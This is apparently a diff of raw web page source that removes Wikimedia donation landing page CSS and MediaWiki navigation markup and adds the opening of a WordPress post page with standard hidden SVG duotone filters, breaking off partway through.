-.amount-options input[type="radio"] {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    margin: -1px;
-    padding: 0;
-    overflow: hidden;
-    border: 0;
-    clip: rect(0 0 0 0);
-}
-
-.frb-btn,
-.payment-method-button {
-    display: flex;
-    justify-content: center;
-    align-content: center;
-    align-items: center;
-    flex-wrap: wrap;
-    height: 50px;
-    padding: 0 4px;
-    border-radius: 2px;
-    font-family: inherit;
-    font-weight: 500;
-    cursor: pointer;
-    transition: background-color 100ms, color 100ms, border-color 100ms, box-shadow 100ms;
-    background-color: #f8f9fa;
-    color: #222;
-    border: 1px solid #a2a9b1;
-}
-
-.frb-btn:hover {
-    background-color: #fff;
-    color: #444;
-    border-color: #a2a9b1;
-}
-
-.frb-btn:active {
-    background-color: #c8ccd1;
-    color: #000;
-    border-color: #72777d;
-    box-shadow: none;
-}
-
-input[type="radio"]:checked + .frb-btn {
-    background-color: #2a4b8d;
-    color: #fff;
-    border-color: #2a4b8d;
-}
-
-.frb-btn:focus,
-.payment-method-button:focus {
-    outline: 0;
-    border-color: #36c;
-    box-shadow: inset 0 0 0 1px #36c;
-}
-
-input[type="radio"]:focus + .frb-btn,
-input[type="radio"]:checked + .frb-btn:focus {
-    box-shadow: inset 0 0 0 1px #36c, inset 0 0 0 2px #fff;
-}
-
-.payment-method-button {
-    color: #36c;
-}
-
-.payment-method-button:hover {
-    background-color: #fff;
-    border-color: #447ff5;
-}
-
-.payment-method-button:active {
-    background-color: #eff3fa;
-    color: #2a4b8d;
-    border-color: #2a4b8d;
-    box-shadow: none;
-}
-
-/* --- Donation Amounts --- */
-
-.amount-options li {
-    white-space: nowrap;
-}
-
-.amount-options .frb-btn {
-    height: 60px;
-    font-size: 15px;
-}
-
-/* Smaller font size for countries with v long amounts */
-.country-CO .amount-options .frb-btn,
-.country-CR .amount-options .frb-btn,
-.country-KR .amount-options .frb-btn,
-.country-PY .amount-options .frb-btn,
-.country-VN .amount-options .frb-btn {
-    font-size: 13px;
-}
-
-.input_amount_other .frb-btn span {
-    display: block;
-    font-size: 12px;
-    line-height: 1;
-    margin-bottom: 2px;
-    white-space: normal;
-    text-align: center;
-}
-
-.input_amount_other input {
-    display: block;
-    width: 100%;
-    border: 1px solid #a2a9b1;
-    color: #222;
-    padding: 2px;
-    border-radius: 2px;
-    direction: ltr;
-    text-align: center;
-    font-family: inherit;
-    font-size: 16px; /* must be >=16px or mobile Safari zooms in when selected */
-    -webkit-appearance: none;
-    -moz-appearance: none;
-    appearance: none;
-    margin: 0 4px;
-}
-
-/* --- Opt-in and PTF input styles --- */
-
-.lp-radio-wrapper,
-.lp-checkbox-wrapper {
-    display: table;
-}
-
-.lp-radio,
-.lp-checkbox {
-    display: table-cell;
-    vertical-align: top;
-    margin: 7px 8px 8px 2px;
-    cursor: pointer;
-}
-
-body.rtl .lp-radio,
-body.rtl .lp-checkbox {
-    margin: 7px 2px 8px 8px;
-}
-
-.lp-radio-label,
-.lp-checkbox-label {
-    display: table-cell;
-    vertical-align: top;
-    padding: 4px 0;
-    white-space: normal;
-    font-size: 14px;
-    line-height: 18px;
-    font-weight: normal;
-    cursor: pointer;
-}
-
-.lp-radio-label:hover,
-.lp-radio:focus + .lp-radio-label,
-.lp-radio:hover + .lp-radio-label,
-.lp-checkbox-label:hover,
-.lp-checkbox:focus + .lp-checkbox-label,
-.lp-checkbox:hover + .lp-checkbox-label {
-    color: #36c;
-    text-decoration: none;
-}
-
-/* --- Opt-in --- */
-
-.optin-options {
-    padding: 0 4px !important;
-}
-
-.optin-options legend {
-    padding: 0;
-    font-size: inherit;
-    font-weight: bold;
-}
-
-.optin-options ul {
-    list-style: none;
-    margin: 0;
-}
-
-.optin-options li {
-    display: table;
-}
-
-.optin-smallprint {
-    clear: both;
-    font-size: 12px;
-    line-height: 14px;
-    margin-top: 8px;
-}
-
-.optin-no-prompt {
-    display: none;
-    margin: 0;
-    padding: 6px;
-    border: 2px solid #900;
-    border-radius: 2px;
-    font-size: 14px;
-    line-height: 18px;
-    font-weight: normal;
-}
-
-.optin-no-prompt.is-positive {
-    border-color: #14866d;
-    font-weight: bold;
-}
-
-.optin-no-prompt__yes { display: none; }
-.optin-no-prompt__no  { display: block; }
-
-.optin-no-prompt.is-positive .optin-no-prompt__yes { display: block; }
-.optin-no-prompt.is-positive .optin-no-prompt__no  { display: none; }
-
-/* --- PTF --- */
-.ptf {
-    display: none;
-    padding: 0 4px;
-}
-
-/* --- Payment method buttons --- */
-
-.payment-method-div {
-    padding: 4px 4px;
-}
-
-/* Hide extra empty <p> tags between buttons */
-.payment-method-div ~ p {
-    display: none;
-}
-
-.payment-method-button {
-    margin: 0;
-    width: 100%;
-    font-size: 15px;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-    appearance: none;
-    overflow: hidden;
-}
-
-/* --- Infobox ("Where your donation goes") --- */
-
-#infobox-wrapper {
-    font-size: 13px;
-    line-height: 1.4;
-    color: #54595d;
-    font-weight: normal;
-    padding: 8px 4px 0 4px;
-}
-
-#infobox-wrapper h2 {
-    font-size: 16px;
-    font-weight: bold;
-    color: inherit;
-    border: 0;
-    margin-bottom: 8px;
-}
-
-/* --- Privacy and links --- */
-
-#donate-footer {
-    width: 100%;
-    text-align: center;
-    line-height: 1.4;
-    padding: 24px 15% 8px;
-}
-
-#donate-footer > div {
-    margin-bottom: 16px;
-}
-
-.donate-smallprint,
-#donor-policy-block {
-    font-size: 12px;
-}
-
-.form-info-links,
-.form-info-links ul {
-    list-style: none;
-    margin: 0;
-    text-align: center;
-}
-
-.form-info-links li {
-    display: inline-block;
-}
-
-.form-info-links a.external {
-    padding: 14px !important;
-}
-
-/* --- Footer --- */
-
-.mw-footer {
-    display: none;
-}
-
-.payment-method-button svg {
-    margin: 0 4px;
-}
-
-/* Credit card logos.
- * Classes are added by https://donate.wikimedia.org/wiki/MediaWiki:DonationForm.js ---
- */
-.paymentmethod-cc svg {
-    display: none;
-    height: 26px;
-    border: 1px solid #c8ccd1;
-    border-radius: 4px;
-}
-
-.cctypes-vmad,
-.cctypes-vmaj,
-.cctypes-vmj,
-.cctypes-vma,
-.cctypes-vm,
-.cctypes-CBvma,
-.cctypes-vmar {
-    font-size: 0; /* Remove spacing between icons */
-}
-
-.cctypes-vmad  span,
-.cctypes-vmaj  span,
-.cctypes-vmj   span,
-.cctypes-vma   span,
-.cctypes-vm    span,
-.cctypes-CBvma span,
-.cctypes-vmar  span {
-    display: none; /* Hide default text */
-}
-
-.cctypes-vmad  .cc-logo-visa,
-.cctypes-vmad  .cc-logo-mastercard,
-.cctypes-vmad  .cc-logo-amex,
-.cctypes-vmad  .cc-logo-discover,
-
-.cctypes-vmaj  .cc-logo-visa,
-.cctypes-vmaj  .cc-logo-mastercard,
-.cctypes-vmaj  .cc-logo-amex,
-.cctypes-vmaj  .cc-logo-jcb,
-
-.cctypes-vmj   .cc-logo-visa,
-.cctypes-vmj   .cc-logo-mastercard,
-.cctypes-vmj   .cc-logo-jcb,
-
-.cctypes-vma   .cc-logo-visa,
-.cctypes-vma   .cc-logo-mastercard,
-.cctypes-vma   .cc-logo-amex,
-
-.cctypes-vm    .cc-logo-visa,
-.cctypes-vm    .cc-logo-mastercard,
-
-.cctypes-CBvma .cc-logo-CB,
-.cctypes-CBvma .cc-logo-visa,
-.cctypes-CBvma .cc-logo-mastercard,
-.cctypes-CBvma .cc-logo-amex,
-
-.cctypes-vmar .cc-logo-visa,
-.cctypes-vmar .cc-logo-mastercard,
-.cctypes-vmar .cc-logo-amex,
-.cctypes-vmar .cc-logo-rupay {
-    display: inline-block !important;
-}
-
-.paymentmethod-cc .cc-logo-rupay {
-    border: 0;
-}
-
-/* Logos - WP on top, WMF horizontal below */
-#p-logo a {
-    /* Need explicit height for backgrounds for IE */
-    background: top 30% center/160px 24px url(https://donate.wikimedia.org/static/images/mobile/copyright/wikipedia-wordmark-en.svg), top 70% center/160px 37px url(https://upload.wikimedia.org/wikipedia/donate/6/60/Wmf_logo_horiz_K.svg);
-    background-repeat: no-repeat;
-    margin-left: 8px;
-}
-
-/* Mobile styles */
-@media screen and (max-width: 981px) {
-    
-    /* Text &amp; Logo layout */
-    #content {
-        margin: 0;
-        padding: 140px 8px 8px 8px;
-    }
-
-    #mw-panel, #p-logo, #p-logo a {
-        width: 100% !important;
-        height: 160px;
-    }
-
-    #p-logo a {
-        margin-left: 0;
-    }
-
-    /* Hide appeal */
-    #appeal-wrapper {
-        display: none;
-    }
-
-    #form-wrapper {
-        padding: 16px;
-    }
-
-    /* Smallprint and links */
-    #donate-footer {
-        margin: 24px 0 0 0;
-        padding: 0;
-    }
-
-    /* Footer */
-    div#footer {
-        margin: 0;
-    }
-}
-/* === end of Template:Styles/Default.css === */</style> 
-</p>
-</div>
-<p> <style>/* === Template:Styles/Default.css === */
-
-*,
-*:before,
-*:after {
-    -moz-box-sizing: border-box;
-    -webkit-box-sizing: border-box;
-    box-sizing: border-box;
-}
-
-/* Hide these until the required JavaScript fiddling has been done */
-#actual-form,
-.consider-amounts {
-    display: none;
-}
-
-#actual-form-loading {
-    text-align: center;
-    line-height: 1.2;
-}
-
-.error-nojs {
-    max-width: 300px;
-    color: #d33;
-}
-
-/* Hide default MediaWiki stuff we don't want */
-
-#mw-page-base, #mw-head-base,
-#mw-panel .portal,
-#mw-head, #catlinks,
-#firstHeading, #contentSub, #siteSub,
-#jump-to-nav, .uls-tipsy {
-    display: none;
-}
-
-/* Re-add gradient background */
-body {
-    background-image: linear-gradient(to bottom, #fff 40px, #f6f6f6 80px);
-    background-position: top;
-    background-repeat: repeat-x;
-    background-color: #f6f6f6;
-}
-
-#content {
-    background-color: transparent;
-    background-image: none;
-    border: 0;
-    padding-top: 32px;
-}
-
-/* Link colors for visibility */
-.mw-parser-output a,
-.mw-parser-output a.external,
-.mw-parser-output a.extiw {
-    color: #36c;
-}
-
-.mw-parser-output a:visited,
-.mw-parser-output a.external:visited,
-.mw-parser-output a.extiw:visited {
-    color: #6f4db3;
-}
-
-.lp-error {
-    color: #d33;
-    font-weight: 500;
-    font-size: 14px;
-}
-
-.amount-options .lp-error {
-    margin: 0 4px;
-}
-
-/* Prevent site logos from showing through modals (e.g. for monthly convert) */
-.vector-body {
-	position: inherit;
-}
-
-body.modal-open {
-	overflow: hidden;
-	position: fixed;
-}
-
-/* --- Overall layout of the landing page --- */
-
-#main-wrapper {
-    width: 100%;
-    display: flex;
-    justify-content: center;
-}
-
-body.rtl #main-wrapper {
-    direction: rtl;
-}
-
-#form-wrapper {
-    width: 380px;
-    background-color: #fff;
-    border: 1px solid #a2a9b1;
-    border-radius: 2px;
-    padding: 24px;
-    color: #222;
-}
-
-#appeal-wrapper {
-    flex: 1;
-    padding-left: 0;
-    padding-right: 28px;
-}
-
-body.rtl #appeal-wrapper {
-    padding-left: 28px;
-    padding-right: 0;
-}
-
-/* --- Appeal --- */
-
-#appeal {
-    font-size: 16px;
-}
-
-#appeal h2,
-#appeal-head {
-    font-size: 21px;
-    padding-bottom: 10px;
-    border-bottom: 1px solid #a2a9b1;
-    margin-bottom: 21px;
-}
-
-.quote-wrapper {
-    padding: 140px 0;
-}
-
-/* --- Hide non-monthly capable payment methods on monthly forms --- */
-
-.form-monthly .not-monthly-capable {
-    display: none;
-}
-
-/* --- Form --- */
-
-#donate-form-wrapper fieldset {
-    width: 100%;
-    border: 0;
-    margin: 0 0 8px 0;
-    padding: 0;
-}
-
-.frequency-options ul,
-.amount-options ul {
-    display: flex;
-    margin: 0;
-    padding: 0;
-    list-style: none;
-}
-
-.frequency-options ul li,
-.amount-options ul li {
-    flex: 1 0 0;
-    padding: 4px;
-}
-
-/* --- Subheaders --- */
-
-#radiobuttons-table-header,
-#paymenttype-table-header {
-    display: block;
-    margin-bottom: 6px;
-    text-align: center;
-    font-weight: bold;
-}
-
-/* --- Commmon button styles --- */
-
-.frequency-options input[type="radio"],
-.amount-options input[type="radio"] {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    margin: -1px;
-    padding: 0;
-    overflow: hidden;
-    border: 0;
-    clip: rect(0 0 0 0);
-}
-
-.frb-btn,
-.payment-method-button {
-    display: flex;
-    justify-content: center;
-    align-content: center;
-    align-items: center;
-    flex-wrap: wrap;
-    height: 50px;
-    padding: 0 4px;
-    border-radius: 2px;
-    font-family: inherit;
-    font-weight: 500;
-    cursor: pointer;
-    transition: background-color 100ms, color 100ms, border-color 100ms, box-shadow 100ms;
-    background-color: #f8f9fa;
-    color: #222;
-    border: 1px solid #a2a9b1;
-}
-
-.frb-btn:hover {
-    background-color: #fff;
-    color: #444;
-    border-color: #a2a9b1;
-}
-
-.frb-btn:active {
-    background-color: #c8ccd1;
-    color: #000;
-    border-color: #72777d;
-    box-shadow: none;
-}
-
-input[type="radio"]:checked + .frb-btn {
-    background-color: #2a4b8d;
-    color: #fff;
-    border-color: #2a4b8d;
-}
-
-.frb-btn:focus,
-.payment-method-button:focus {
-    outline: 0;
-    border-color: #36c;
-    box-shadow: inset 0 0 0 1px #36c;
-}
-
-input[type="radio"]:focus + .frb-btn,
-input[type="radio"]:checked + .frb-btn:focus {
-    box-shadow: inset 0 0 0 1px #36c, inset 0 0 0 2px #fff;
-}
-
-.payment-method-button {
-    color: #36c;
-}
-
-.payment-method-button:hover {
-    background-color: #fff;
-    border-color: #447ff5;
-}
-
-.payment-method-button:active {
-    background-color: #eff3fa;
-    color: #2a4b8d;
-    border-color: #2a4b8d;
-    box-shadow: none;
-}
-
-/* --- Donation Amounts --- */
-
-.amount-options li {
-    white-space: nowrap;
-}
-
-.amount-options .frb-btn {
-    height: 60px;
-    font-size: 15px;
-}
-
-/* Smaller font size for countries with v long amounts */
-.country-CO .amount-options .frb-btn,
-.country-CR .amount-options .frb-btn,
-.country-KR .amount-options .frb-btn,
-.country-PY .amount-options .frb-btn,
-.country-VN .amount-options .frb-btn {
-    font-size: 13px;
-}
-
-.input_amount_other .frb-btn span {
-    display: block;
-    font-size: 12px;
-    line-height: 1;
-    margin-bottom: 2px;
-    white-space: normal;
-    text-align: center;
-}
-
-.input_amount_other input {
-    display: block;
-    width: 100%;
-    border: 1px solid #a2a9b1;
-    color: #222;
-    padding: 2px;
-    border-radius: 2px;
-    direction: ltr;
-    text-align: center;
-    font-family: inherit;
-    font-size: 16px; /* must be >=16px or mobile Safari zooms in when selected */
-    -webkit-appearance: none;
-    -moz-appearance: none;
-    appearance: none;
-    margin: 0 4px;
-}
-
-/* --- Opt-in and PTF input styles --- */
-
-.lp-radio-wrapper,
-.lp-checkbox-wrapper {
-    display: table;
-}
-
-.lp-radio,
-.lp-checkbox {
-    display: table-cell;
-    vertical-align: top;
-    margin: 7px 8px 8px 2px;
-    cursor: pointer;
-}
-
-body.rtl .lp-radio,
-body.rtl .lp-checkbox {
-    margin: 7px 2px 8px 8px;
-}
-
-.lp-radio-label,
-.lp-checkbox-label {
-    display: table-cell;
-    vertical-align: top;
-    padding: 4px 0;
-    white-space: normal;
-    font-size: 14px;
-    line-height: 18px;
-    font-weight: normal;
-    cursor: pointer;
-}
-
-.lp-radio-label:hover,
-.lp-radio:focus + .lp-radio-label,
-.lp-radio:hover + .lp-radio-label,
-.lp-checkbox-label:hover,
-.lp-checkbox:focus + .lp-checkbox-label,
-.lp-checkbox:hover + .lp-checkbox-label {
-    color: #36c;
-    text-decoration: none;
-}
-
-/* --- Opt-in --- */
-
-.optin-options {
-    padding: 0 4px !important;
-}
-
-.optin-options legend {
-    padding: 0;
-    font-size: inherit;
-    font-weight: bold;
-}
-
-.optin-options ul {
-    list-style: none;
-    margin: 0;
-}
-
-.optin-options li {
-    display: table;
-}
-
-.optin-smallprint {
-    clear: both;
-    font-size: 12px;
-    line-height: 14px;
-    margin-top: 8px;
-}
-
-.optin-no-prompt {
-    display: none;
-    margin: 0;
-    padding: 6px;
-    border: 2px solid #900;
-    border-radius: 2px;
-    font-size: 14px;
-    line-height: 18px;
-    font-weight: normal;
-}
-
-.optin-no-prompt.is-positive {
-    border-color: #14866d;
-    font-weight: bold;
-}
-
-.optin-no-prompt__yes { display: none; }
-.optin-no-prompt__no  { display: block; }
-
-.optin-no-prompt.is-positive .optin-no-prompt__yes { display: block; }
-.optin-no-prompt.is-positive .optin-no-prompt__no  { display: none; }
-
-/* --- PTF --- */
-.ptf {
-    display: none;
-    padding: 0 4px;
-}
-
-/* --- Payment method buttons --- */
-
-.payment-method-div {
-    padding: 4px 4px;
-}
-
-/* Hide extra empty <p> tags between buttons */
-.payment-method-div ~ p {
-    display: none;
-}
-
-.payment-method-button {
-    margin: 0;
-    width: 100%;
-    font-size: 15px;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-    appearance: none;
-    overflow: hidden;
-}
-
-/* --- Infobox ("Where your donation goes") --- */
-
-#infobox-wrapper {
-    font-size: 13px;
-    line-height: 1.4;
-    color: #54595d;
-    font-weight: normal;
-    padding: 8px 4px 0 4px;
-}
-
-#infobox-wrapper h2 {
-    font-size: 16px;
-    font-weight: bold;
-    color: inherit;
-    border: 0;
-    margin-bottom: 8px;
-}
-
-/* --- Privacy and links --- */
-
-#donate-footer {
-    width: 100%;
-    text-align: center;
-    line-height: 1.4;
-    padding: 24px 15% 8px;
-}
-
-#donate-footer > div {
-    margin-bottom: 16px;
-}
-
-.donate-smallprint,
-#donor-policy-block {
-    font-size: 12px;
-}
-
-.form-info-links,
-.form-info-links ul {
-    list-style: none;
-    margin: 0;
-    text-align: center;
-}
-
-.form-info-links li {
-    display: inline-block;
-}
-
-.form-info-links a.external {
-    padding: 14px !important;
-}
-
-/* --- Footer --- */
-
-.mw-footer {
-    display: none;
-}
-
-.payment-method-button svg {
-    margin: 0 4px;
-}
-
-/* Credit card logos.
- * Classes are added by https://donate.wikimedia.org/wiki/MediaWiki:DonationForm.js ---
- */
-.paymentmethod-cc svg {
-    display: none;
-    height: 26px;
-    border: 1px solid #c8ccd1;
-    border-radius: 4px;
-}
-
-.cctypes-vmad,
-.cctypes-vmaj,
-.cctypes-vmj,
-.cctypes-vma,
-.cctypes-vm,
-.cctypes-CBvma,
-.cctypes-vmar {
-    font-size: 0; /* Remove spacing between icons */
-}
-
-.cctypes-vmad  span,
-.cctypes-vmaj  span,
-.cctypes-vmj   span,
-.cctypes-vma   span,
-.cctypes-vm    span,
-.cctypes-CBvma span,
-.cctypes-vmar  span {
-    display: none; /* Hide default text */
-}
-
-.cctypes-vmad  .cc-logo-visa,
-.cctypes-vmad  .cc-logo-mastercard,
-.cctypes-vmad  .cc-logo-amex,
-.cctypes-vmad  .cc-logo-discover,
-
-.cctypes-vmaj  .cc-logo-visa,
-.cctypes-vmaj  .cc-logo-mastercard,
-.cctypes-vmaj  .cc-logo-amex,
-.cctypes-vmaj  .cc-logo-jcb,
-
-.cctypes-vmj   .cc-logo-visa,
-.cctypes-vmj   .cc-logo-mastercard,
-.cctypes-vmj   .cc-logo-jcb,
-
-.cctypes-vma   .cc-logo-visa,
-.cctypes-vma   .cc-logo-mastercard,
-.cctypes-vma   .cc-logo-amex,
-
-.cctypes-vm    .cc-logo-visa,
-.cctypes-vm    .cc-logo-mastercard,
-
-.cctypes-CBvma .cc-logo-CB,
-.cctypes-CBvma .cc-logo-visa,
-.cctypes-CBvma .cc-logo-mastercard,
-.cctypes-CBvma .cc-logo-amex,
-
-.cctypes-vmar .cc-logo-visa,
-.cctypes-vmar .cc-logo-mastercard,
-.cctypes-vmar .cc-logo-amex,
-.cctypes-vmar .cc-logo-rupay {
-    display: inline-block !important;
-}
-
-.paymentmethod-cc .cc-logo-rupay {
-    border: 0;
-}
-
-/* Logos - WP on top, WMF horizontal below */
-#p-logo a {
-    /* Need explicit height for backgrounds for IE */
-    background: top 30% center/160px 24px url(https://donate.wikimedia.org/static/images/mobile/copyright/wikipedia-wordmark-en.svg), top 70% center/160px 37px url(https://upload.wikimedia.org/wikipedia/donate/6/60/Wmf_logo_horiz_K.svg);
-    background-repeat: no-repeat;
-    margin-left: 8px;
-}
-
-/* Mobile styles */
-@media screen and (max-width: 981px) {
-    
-    /* Text &amp; Logo layout */
-    #content {
-        margin: 0;
-        padding: 140px 8px 8px 8px;
-    }
-
-    #mw-panel, #p-logo, #p-logo a {
-        width: 100% !important;
-        height: 160px;
-    }
-
-    #p-logo a {
-        margin-left: 0;
-    }
-
-    /* Hide appeal */
-    #appeal-wrapper {
-        display: none;
-    }
-
-    #form-wrapper {
-        padding: 16px;
-    }
-
-    /* Smallprint and links */
-    #donate-footer {
-        margin: 24px 0 0 0;
-        padding: 0;
-    }
-
-    /* Footer */
-    div#footer {
-        margin: 0;
-    }
-}
-/* === end of Template:Styles/Default.css === */</style> 
-</p><p><br /> 
-</p>
-</div>
-<div class="printfooter">Retrieved from "<a dir="ltr" href="https://donate.wikimedia.org/wiki/Special:LandingPage">https://donate.wikimedia.org/wiki/Special:LandingPage</a>"</div></div>
-		<div id="catlinks" class="catlinks catlinks-allhidden" data-mw="interface"></div>
-	</div>
-</div>
-
-<div id="mw-navigation">
-	<h2>Navigation menu</h2>
-	<div id="mw-head">
-		
-<nav id="p-personal" class="mw-portlet mw-portlet-personal vector-user-menu-legacy vector-menu" aria-labelledby="p-personal-label" role="navigation" 
-	 >
-	<label id="p-personal-label" aria-label="" class="vector-menu-heading "  >
-		<span class="vector-menu-heading-label">Personal tools</span>
-	</label>
-	<div class="vector-menu-content">
-		
-		<ul class="vector-menu-content-list"><li id="pt-uls" class="mw-list-item active"><a class="uls-trigger" href="#"><span>English</span></a></li><li id="pt-login" class="mw-list-item"><a href="/w/index.php?title=Special:UserLogin&amp;returnto=Special%3ALandingPage&amp;returntoquery=country%3DXX%26uselang%3Den%26utm_medium%3DwmfSite%26utm_source%3D101%26utm_campaign%3DnavButton" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o"><span>Log in</span></a></li></ul>
-		
-	</div>
-</nav>
-
-		<div id="left-navigation">
-			
-<nav id="p-namespaces" class="mw-portlet mw-portlet-namespaces vector-menu vector-menu-tabs" aria-labelledby="p-namespaces-label" role="navigation" 
-	 >
-	<label id="p-namespaces-label" aria-label="" class="vector-menu-heading "  >
-		<span class="vector-menu-heading-label">Namespaces</span>
-	</label>
-	<div class="vector-menu-content">
-		
-		<ul class="vector-menu-content-list"><li id="ca-nstab-special" class="selected mw-list-item"><a href="/w/index.php?title=Special:LandingPage&amp;country=XX&amp;uselang=en&amp;utm_medium=wmfSite&amp;utm_source=101&amp;utm_campaign=navButton" title="This is a special page, and it cannot be edited"><span>Special page</span></a></li></ul>
-		
-	</div>
-</nav>
-
-			
-<nav id="p-variants" class="mw-portlet mw-portlet-variants emptyPortlet vector-menu-dropdown-noicon vector-menu vector-menu-dropdown" aria-labelledby="p-variants-label" role="navigation" 
-	 >
-	<input type="checkbox"
-		id="p-variants-checkbox"
-		role="button"
-		aria-haspopup="true"
-		data-event-name="ui.dropdown-p-variants"
-		class="vector-menu-checkbox" aria-labelledby="p-variants-label" />
-	<label id="p-variants-label" aria-label="Change language variant" class="vector-menu-heading "  >
-		<span class="vector-menu-heading-label">English</span>
-	</label>
-	<div class="vector-menu-content">
-		
-		<ul class="vector-menu-content-list"></ul>
-		
-	</div>
-</nav>
-
-		</div>
-		<div id="right-navigation">
-			
-<nav id="p-views" class="mw-portlet mw-portlet-views emptyPortlet vector-menu vector-menu-tabs" aria-labelledby="p-views-label" role="navigation" 
-	 >
-	<label id="p-views-label" aria-label="" class="vector-menu-heading "  >
-		<span class="vector-menu-heading-label">Views</span>
-	</label>
-	<div class="vector-menu-content">
-		
-		<ul class="vector-menu-content-list"></ul>
-		
-	</div>
-</nav>
-
-			
-<nav id="p-cactions" class="mw-portlet mw-portlet-cactions emptyPortlet vector-menu-dropdown-noicon vector-menu vector-menu-dropdown" aria-labelledby="p-cactions-label" role="navigation"  title="More options"
-	 >
-	<input type="checkbox"
-		id="p-cactions-checkbox"
-		role="button"
-		aria-haspopup="true"
-		data-event-name="ui.dropdown-p-cactions"
-		class="vector-menu-checkbox" aria-labelledby="p-cactions-label" />
-	<label id="p-cactions-label" aria-label="" class="vector-menu-heading "  >
-		<span class="vector-menu-heading-label">More</span>
-	</label>
-	<div class="vector-menu-content">
-		
-		<ul class="vector-menu-content-list"></ul>
-		
-	</div>
-</nav>
-
-			
-<div id="p-search" role="search" class="vector-search-box-vue  vector-search-box-show-thumbnail vector-search-box-auto-expand-width vector-search-box">
-	<div>
-			<h3 >
-				<label for="searchInput">Search</label>
-			</h3>
-		<form action="/w/index.php" id="searchform"
-			class="vector-search-box-form">
-			<div id="simpleSearch"
-				class="vector-search-box-inner"
-				 data-search-loc="header-navigation">
-				<input class="vector-search-box-input"
-					 type="search" name="search" placeholder="Search Donate" aria-label="Search Donate" autocapitalize="sentences" title="Search Donate [f]" accesskey="f" id="searchInput"
-				/>
-				<input type="hidden" name="title" value="Special:Search"/>
-				<input id="mw-searchButton"
-					 class="searchButton mw-fallbackSearchButton" type="submit" name="fulltext" title="Search the pages for this text" value="Search" />
-				<input id="searchButton"
-					 class="searchButton" type="submit" name="go" title="Go to a page with this exact name if it exists" value="Go" />
+<body class="post-template-default single single-post postid-58581 single-format-standard font-mktg no-sidebar">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.49803921568627" /><feFuncG type="table" tableValues="0 0.49803921568627" /><feFuncB type="table" tableValues="0 0.49803921568627" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.27843137254902" /><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.64705882352941" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.78039215686275 1" /><feFuncG type="table" tableValues="0 0.94901960784314" /><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 